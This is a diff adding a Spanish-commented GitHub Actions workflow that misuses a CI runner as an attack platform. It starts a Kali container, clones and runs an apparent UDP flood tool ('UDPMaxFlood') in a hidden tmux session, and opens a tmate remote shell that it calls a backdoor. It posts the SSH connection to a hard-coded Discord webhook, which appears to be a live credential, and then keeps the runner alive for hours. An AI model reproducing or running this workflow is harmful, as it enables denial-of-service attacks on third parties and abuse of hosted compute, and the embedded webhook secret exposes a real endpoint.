@@ -1,0 +1,56 @@
+name: Dron de Asalto Supervisado
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Preparar Entorno, Lanzar Misión y Abrir Puerta Trasera
+        id: setup
+        run: |
+          echo "### Creando contenedor Kali..."
+          docker run --rm -d --name kali kalilinux/kali-rolling tail -f /dev/null
+
+          echo "### Instalando armamento (git, jdk, tmate, tmux)..."
+          docker exec kali apt-get update
+          docker exec kali apt-get install -yq \
+            tmate \
+            curl \
+            git \
+            unzip \
+            default-jdk \
+            tmux 
+
+          # --- ¡LA MAGIA DE LA AUTOMATIZACIÓN! ---
+
+          echo "### Creando sesión de terminal oculta llamada 'attack'..."
+          docker exec kali tmux new-session -d -s attack
+
+          echo "### Enviando secuencia de ataque a la sesión oculta..."
+          # El 'C-m' es como presionar ENTER.
+          docker exec kali tmux send-keys -t attack \
+            "git clone https://github.com/feloxgarcia0-stack/UDP2.git /root/attack && cd /root/attack && javac UDPMaxFlood.java && java UDPMaxFlood" C-m
+
+          # --- La misión está en curso. Ahora te damos acceso. ---
+          
+          echo "### Configurando tmate sin barra verde..."
+          docker exec kali bash -c "echo 'set -g status off' > /root/.tmate.conf"
+
+          echo "### Obteniendo coordenadas de la puerta trasera..."
+          tmate_ssh=$(docker exec kali tmate -S /tmp/tmate.sock new-session -d \; wait tmate-ready \; display -p '#{tmate_ssh}')
+          
+          echo "ssh_connection=$tmate_ssh" >> $GITHUB_OUTPUT
+      
+      - name: Enviar Instrucciones de Acceso a Discord
+        env:
+          SSH_CONNECTION: ${{ steps.setup.outputs.ssh_connection }}
+          WEBHOOK_URL: "https://discord.com/api/webhooks/1398292786876387439/Vmc5Ms5ZoF7GYp8yVwKZV1Q6k1Ht97k5tRRDZOG9_TNJQndDzxHx-1XpZYAQrPjtQvmJ"
+        run: |
+          # El mensaje ahora tiene DOS PASOS. Es crucial.
+          JSON_PAYLOAD=$(printf '{"content": "🚀 **Dron de KALI ejecutando misión.**\\n\\nEl programa está esperando tu interacción. Sigue estos **DOS PASOS**:\\n\\n**1. Conéctate a la VPS con este comando:**\\n`%s`\\n\\n**2. Una vez dentro, ejecuta este OTRO comando para ver la interfaz:**\\n`tmux attach -t attack`"}' "$SSH_CONNECTION")
+          curl -H "Content-Type: application/json" -X POST -d "$JSON_PAYLOAD" "$WEBHOOK_URL"
+
+      - name: Mantener Dron y Acceso Activos
+        run: sleep 21000
